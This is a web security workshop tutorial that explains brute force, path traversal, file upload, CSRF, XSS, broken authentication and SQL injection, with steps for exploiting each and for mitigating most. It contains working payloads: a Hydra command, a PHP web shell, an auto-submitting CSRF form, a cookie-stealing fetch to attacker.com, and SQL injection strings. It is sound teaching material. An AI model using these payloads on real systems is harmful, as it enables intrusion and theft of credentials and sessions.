# Most common web vulnerabilities and how to exploit them

==**Requirements:** None==

This first part of the workshop consists of a theoretical explanation of the different types of vulnerabilities that are most common today.

**For each vulnerability/attack the following will be detailed:**
- Brief Description
- Main Causes
- How to Exploit the vulnerability
- Mitigation

**Vulnerabilities/Attacks to cover**
1. Brute-Force
2. Directory/Path Traversal
3. File Upload
4. Cross-Site Request Forgery (CSRF)
5. Cross-Site Scripting (XSS)
6. Broken Authentication
7. SQL Injection
## Brute-Force
### What is it?
A brute-force attack is a method where an attacker systematically tries all possible combinations of usernames and/or passwords until the correct one is found. This type of attack relies on repetition and automation and, while it may take time, it can succeed if no security measures are in place.

**Note:** Brute-force attacks are not exclusive to login portals. They are also commonly used to crack password hashes, decrypt encrypted data, or even guess cryptographic keys by systematically trying all possible combinations until the correct one is found.
### Main Causes
 -  **Weak or common passwords:** Users often choose simple, easy-to-guess passwords or reuse them across multiple platforms, making them vulnerable.
 
-  **No limitations on login attempts:** If the system does not restrict the number of failed login attempts, attackers can make unlimited guesses without consequences.

-  **Lack of multi-factor authentication (MFA):** Without an additional layer of security, like one-time passcodes or biometric verification, a guessed password alone can grant access.

-  **Absence of CAPTCHA mechanisms:** Without CAPTCHAs, attackers can use automated tools to try multiple combinations.
### How to Exploit?
In order to successfully conduct a brute-force attack we first must check that the application has some of the previously described issues.

Once we know that the web application is vulnerable, we can start a brute-force attack using many different tools like Hydra, Medusa, John The Ripper or BurpSuite.
For now we'll only focus on hydra.

#### 1. Analyze the login form or entry point
- Inspect the application’s login mechanism (e.g., login page, API endpoint, or other authentication methods).
- Use tools like **Burp Suite** or your favorite browser's developer tools to monitor the HTTP request sent when submitting login credentials.
- Look for details such as:
	- The HTTP method used (POST or GET).
	- The endpoint URL (e.g., `/login` or `/authenticate`).
	- The payload structure (e.g., `username=admin&password=12345`).
	- Response codes for success (e.g., `200 OK`) and failure (e.g., `401 Unauthorized`).
#### 2. Understand the response behavior
- Analyze how the application responds to incorrect credentials.
- Check for indicators like:
	- Error messages (e.g., "Invalid username or password").
	- Redirects upon successful login.
	- Specific keywords in the response body (e.g., `Welcome` or `Login failed`).
#### 3. Determine if rate-limiting or protections are in place
- Test if there are restrictions on the number of login attempts per session or IP address.
- Verify whether mechanisms like CAPTCHAs appear after multiple failed attempts.
#### 4. **Automate the attack with Hydra**
Once the structure of the request and the response behavior are fully understood, you can use a tool like Hydra for automation like this:
```bash
hydra -l admin -P passwords.txt -s 80 example.com http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
```
- `-l admin`: Target username.
- `-P passwords.txt`: Wordlist containing password guesses.
- `http-post-form`: Specifies the login form type.
- `F=Login failed`: The keyword that identifies a failed attempt.

#### 5. Iterate and refine:
If the attack fails due to rate-limiting or CAPTCHA, explore bypass techniques such as rotating IPs using proxies or solving CAPTCHAs with automated tools.
### How to Mitigate?
- **Enforce strong password policies:** Require users to create long and complex passwords (a mix of uppercase and lowercase letters, numbers, and special characters). Validate passwords against databases of leaked or commonly used passwords.

- **Limit login attempts:** Implement a limit on failed login attempts per session or IP address, with temporary or permanent lockouts after repeated failures.

- **Use CAPTCHAs:** Add CAPTCHAs to login forms to prevent automated bots from making attempts.

- **Multi-factor authentication (MFA):** Require a second authentication factor, such as a one-time code sent via SMS or generated by an authenticator app.

- **Monitor and log failed login attempts:** Track all login attempts and set alerts for unusual patterns (e.g., rapid-fire attempts from the same IP).

- **Leverage security tools:** Deploy Web Application Firewalls (WAFs) to detect and block brute-force attempts in real-time.
## Directory/Path Traversal
### What is it?
Directory Traversal, also known as *Path Traversal*, is a vulnerability that allows attackers to access files and directories stored *outside the web root folder by manipulating file path inputs*. Exploiting this flaw can lead to exposure of sensitive data, including configuration files, password files, or other critical information.

### Main Causes
- **Improper input validation:** Applications fail to validate or sanitize user-supplied input, allowing malicious path modifications.

- **Use of relative file paths:** Applications rely on relative paths without restrictions, making them susceptible to traversal attempts (e.g., `../../`).

- **Insecure file access logic:** The application does not implement checks to restrict file access to specific directories.

- **Overly permissive file system permissions:** Misconfigured server permissions grant unauthorized access to sensitive files.
### How to Exploit?
#### 1. Identify file inclusion functionality
Locate endpoints or features where user input specifies file paths, such as download pages or configuration previews.
Here's an example of a **vulnerable** url
```bash
http://example.com/?file=report.pdf
```
#### 2. Test traversal sequences
Attempt traversal patterns like `../../` to navigate up the directory structure.
Here's an example for a **payload**
```bash
http://example.com/?file=../../../../etc/passwd
```
#### 3. Verify file exposure
- If successful, sensitive files such as `etc/passwd` (Linux) or `boot.ini` (Windows) may be accessed.
- Confirm by observing the HTTP response or content displayed on the page.

**You can use the following tools to speed up the path traversal detection and exploitation process**
- **Burp Suite:** Intercept requests and modify file paths to test for traversal.
- **DirBuster:** Automate discovery of files and directories.
- **curl or wget:** Manually test traversal payloads directly in the terminal.
### How to Mitigate?
- **Sanitize and validate input:** Ensure that user input does not contain illegal characters like `../` or other traversal patterns. Use a whitelist of allowed file names or paths.

- **Use absolute file paths:** Construct file paths using absolute paths, ensuring user input cannot modify the base directory.

- **Restrict file system permissions:** Limit access to sensitive directories and files through proper server-side permission settings.

- **Implement access controls:** Verify that the user has appropriate authorization before accessing specific files.

- **Error message handling:** Suppress detailed file system error messages that could aid attackers in identifying traversal opportunities.

- **Security tools and testing:** Use tools like static application security testing (SAST) or dynamic application security testing (DAST) to detect directory traversal vulnerabilities.
## File Upload
File upload vulnerabilities occur when an application allows users to *upload files without properly validating or restricting their content*. Attackers can exploit this to *upload malicious files, such as scripts, which can be executed on the server to compromise* the system or gain unauthorized access.
### Main Causes
- **Lack of file type validation:** The application does not verify the type or content of uploaded files, allowing potentially dangerous files to be uploaded.

- **Improper file storage handling:** Uploaded files are stored in directories accessible via the web without sanitizing their names or paths.

- **Execution of uploaded files:** Servers are configured to execute certain file types (e.g., `.php`, `.asp`), allowing attackers to upload and execute scripts.

- **No restrictions on file size:** The application does not enforce size limits, enabling attackers to upload excessively large files to exhaust server resources.

- **Weak permissions:** The server assigns overly permissive access rights to uploaded files, making them executable or accessible by unauthorized users.
### How to exploit?
#### 1. Identify file upload functionality
Locate forms or endpoints where files can be uploaded (e.g., profile pictures, document submissions).
Here's an example of a vulnerable form:
```html
<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```
#### 2. Test for validation bypass
- Attempt to upload various file types to see if the application enforces restrictions.
- **Examples:**
    - A simple image file (e.g., `image.jpg`) to check basic functionality.
    - A malicious script disguised as an image (e.g., `image.php.jpg`).
#### 3. Verify upload location
- Inspect the server response or use tools like **Burp Suite** to find the file’s storage path (e.g., `/uploads/filename`).
- Access the uploaded file directly in the browser to confirm execution.

#### 4. Upload a malicious script
If the server executes uploaded files, upload a script such as:
```php
<?php echo system($_GET['cmd']); ?>
```
Then execute commands by visiting
```bash
http://example.com/uploads/malicious.php?cmd=ls
```

**You can use the following tools to speed up file upload vulnerabilities detection and exploitation process**
- **Burp Suite:** Intercept and modify upload requests.
- **curl or Postman:** Manually test upload endpoints.
- **weevely or Metasploit:** Automate shell uploads and interactions.
### How to Mitigate?
- **Validate file types:** Allow only specific, safe file types (e.g., `.jpg`, `.png`, `.pdf`) by validating file extensions and MIME types.

- **Scan file content:** Use antivirus or file scanning tools to detect malicious content in uploaded files.

- **Store files outside the web root:** Place uploaded files in a directory that is not directly accessible via the web to prevent execution.

- **Rename uploaded files:** Assign random names or sanitize file names to prevent directory traversal or overwriting of existing files.

- **Restrict file permissions:** Ensure that uploaded files are stored with minimal permissions, such as read-only, and are not executable.

- **Enforce file size limits:** Set maximum file size limits to prevent resource exhaustion.

- **Use a Content Security Policy (CSP):** Configure CSP headers to block the execution of scripts from uploaded files.

- **Implement security testing:** Regularly test file upload features with static and dynamic application security tools to identify vulnerabilities.
## Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) is a vulnerability where an attacker **tricks a user into unknowingly performing actions on a web application where they are authenticated**. This attack leverages the trust between the user’s browser and the web application, *exploiting their active session to execute unauthorized actions on their behalf*.
### Main Causes
- **Lack of anti-CSRF tokens:** The application does not use unique, per-session tokens to verify the legitimacy of user-initiated requests.

- **Relying solely on session cookies:** The application authenticates requests based solely on session cookies without additional verification mechanisms.

- **No origin or referer header validation:** The server does not validate the `Origin` or `Referer` headers to ensure requests are coming from trusted sources.

- **Predictable or reusable requests:** Actions like form submissions or API calls are performed via predictable URLs that can be exploited.
### How to Exploit?
#### 1. Identify a target action
Locate sensitive actions in the application, such as changing passwords, transferring funds, or modifying user settings.
Here's an example of a vulnerable request:
```
POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded

amount=1000&to_account=12345
```
#### 2. Craft a malicious request
Construct an HTML form or JavaScript snippet that performs the same action when loaded.
Here's an example:
```html
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to_account" value="12345">
    <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```
#### 3. Deliver the payload to the victim
- Embed the malicious form or script into an email, forum post, or malicious website.
- Once the victim visits the page, the form submits automatically, performing the action without their knowledge.
- If successful, the action is executed using the victim’s session and privileges.
### How to Mitigate?
- **Implement anti-CSRF tokens:** Generate unique, per-session tokens for each user and require them in all state-changing requests. Validate the token on the server side to ensure it matches the current session.

- **Validate Origin and Referer headers:** Check the `Origin` or `Referer` headers of incoming requests to ensure they originate from trusted domains.    

- **Use the SameSite cookie attribute:** Configure session cookies with the `SameSite` attribute set to `Strict` or `Lax` to prevent them from being sent with cross-site requests.

- **Require re-authentication for sensitive actions:** Ask users to re-enter their passwords or use multi-factor authentication (MFA) before executing critical actions like fund transfers or account changes.

- **Adopt Content Security Policies (CSP):** Use CSP headers to restrict the sources of scripts and forms that can interact with your application.

- **Avoid predictable URLs:** Ensure that sensitive actions or API endpoints require additional validation mechanisms beyond predictable URLs.

- **Educate users:** Encourage users to avoid clicking on suspicious links or visiting untrusted websites, especially when logged in to sensitive applications.
## Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts run in the victim's browser and can be used to steal sensitive information, hijack sessions, or perform malicious actions on behalf of the victim.
### Main Causes
- **Lack of input sanitization:** The application fails to sanitize user input before rendering it in the browser.

- **Improper output encoding:** Dynamic content is output to the page without proper encoding to neutralize special characters.

- **Trusting user input:** Applications assume user-provided data is safe and render it without validation or filtering.

- **Insecure use of client-side scripts:** Client-side JavaScript manipulates DOM elements using untrusted data, making it vulnerable to injection.
### Types of XSS
#### 1. Stored XSS
- The malicious script is permanently stored on the server (e.g., in a database, comment, or message) and served to users when they visit the affected page.
- Example: A comment field stores `<script>alert('XSS');</script>`.
#### 2. Reflected XSS
The malicious script is reflected off the web server, typically via a URL parameter or form input, and immediately executed in the victim’s browser.
Example:
```bash
http://example.com/search?q=<script>alert('XSS')</script>
```
#### 3. DOM-based XSS
The vulnerability exists in the client-side code, where untrusted data is processed directly in the browser to update the DOM.
Example:
```js
document.write(location.hash);
```
### How to Exploit?
#### 1. Identify input points
Look for input fields, URL parameters, or headers that are reflected in the application’s response or stored for later use.
#### 2. Inject test payloads
Test for script injection using basic payloads like:
```html
<script>alert('XSS');</script>
```
For DOM-based XSS, manipulate the browser environment (e.g., `document.location` or `document.cookie`).
#### 3. Deliver the payload
- **Stored XSS:** Submit the payload to a comment field, message system, or another area that will be rendered to users.
- **Reflected XSS:** Share a crafted malicious link with the victim, such as:
```bash
http://example.com?search=<script>alert('XSS');</script>
```
#### 4. Exfiltrate sensitive data
Use scripts to steal cookies, tokens, or other sensitive information, e.g.:
```html
<script>
    fetch('http://attacker.com/log?cookie=' + document.cookie);
</script>
```
### How to Mitigate?
- **Input validation:** Validate all user input to ensure it conforms to expected formats and reject malicious data.

- **Output encoding:** Encode all dynamic content before rendering it in the browser, using context-appropriate encoding.

- **Use Content Security Policy (CSP):** Enforce a CSP header to restrict the sources of scripts that can run on your website.

- **Avoid dangerous functions:** Avoid using insecure JavaScript methods like `eval()`, `document.write()`, or `innerHTML` when processing untrusted data.

- **Sanitize stored data:** Ensure all data retrieved from storage (e.g., databases) is sanitized before rendering.

- **Apply security libraries:** Use libraries or frameworks with built-in XSS protection, such as `ESAPI` for Java or the `django.utils.html.escape` function in Python.
## Broken Authentication
Broken Authentication occurs when flaws in the implementation of authentication mechanisms allow attackers to compromise user accounts or impersonate users. This can lead to unauthorized access and further exploitation.
### Main Causes
- **Weak password policies:** Users are allowed to create simple or common passwords, making them easy to guess or brute-force.

- **Poor session management:** Session tokens are not securely generated, stored, or invalidated, making them susceptible to theft or reuse.

- **Lack of multi-factor authentication (MFA):** Applications rely solely on passwords without additional layers of protection.

- **Insecure credential storage:** Passwords are stored in plaintext or using weak hashing algorithms.
### How to Exploit?
- **Brute-force login attempts:** Attackers guess username-password combinations using automated tools.

- **Session hijacking:** Stealing or reusing session tokens from cookies, URLs, or storage.

- **Credential stuffing:** Using leaked credentials from other breaches to attempt access.

### How to Mitigate?
- **Enforce strong password policies:** Require complex passwords and validate them against known breached password lists.

- **Implement multi-factor authentication (MFA):** Add a second layer of authentication to protect accounts.

- **Secure session management:** Use secure, unique session tokens and invalidate them on logout or inactivity.

- **Hash and salt passwords:** Store passwords securely using strong hashing algorithms like bcrypt or Argon2.

- **Rate-limit login attempts:** Restrict the number of failed login attempts to prevent brute-force attacks.
## SQL Injection
SQL Injection (SQLi) is a vulnerability where an attacker manipulates an application’s database queries by injecting malicious SQL code into user input fields. This can lead to unauthorized access, data leakage, or even complete database compromise.
### Types of SQL Injection
#### Classic SQL Injection
Directly inject SQL code into input fields to manipulate queries.
**Example:** Inputting `admin' OR '1'='1` in a login form to bypass authentication.
#### Union-Based SQL Injection
Uses the `UNION` operator to retrieve data from other tables by combining query results.
**Example:**
```sql
' UNION SELECT username, password FROM users--
```

#### Blind SQL Injection
Exploits the database without revealing direct output. Relies on observing application behavior, such as page responses or time delays.
**Example:**
```sql
' AND IF(1=1, SLEEP(5), 0)--
```
#### Error-Based SQL Injection
Leverages detailed error messages to gain insight into the database structure.
**Example:**
```sql
' OR 1=CAST((SELECT @@version) AS INT)--
```

### How to Exploit?
#### 1. Identify vulnerable input fields
Test input fields, URL parameters, or headers for reflection in SQL queries.
#### 2. Inject test payloads
Start with simple payloads to test for vulnerability like: `' OR '1'='1`
#### 3. Retrieve sensitive data
Use advanced payloads to extract information:
**Example:**
```sql
' UNION SELECT username, password FROM users--
```

One of the main tools for detecting and exploiting SQL injection vulnerabilities is [SQL Map](https://github.com/sqlmapproject/sqlmap)